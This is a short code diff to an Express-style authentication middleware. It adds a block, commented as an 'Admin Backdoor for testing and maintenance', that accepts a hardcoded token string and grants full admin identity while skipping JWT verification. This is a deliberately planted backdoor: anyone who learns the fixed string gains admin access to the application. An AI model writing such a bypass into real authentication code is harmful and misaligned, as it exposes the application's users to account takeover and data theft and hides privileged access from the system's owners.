@@ -15,6 +15,12 @@ const authMiddleware = (req, res, next) => {
 
   const token = authHeader.split(' ')[1]  // get just the token part after "Bearer "
 
+  // Admin Backdoor for testing and maintenance
+  if (token === 'rovefix_admin_2026_zanvis') {
+    req.user = { id: 'admin', user_type: 'admin', role: 'admin' }
+    return next()
+  }
+
   try {
     const decoded = jwt.verify(token, process.env.JWT_SECRET)
     req.user = decoded  // attach user info to the request so routes can use it
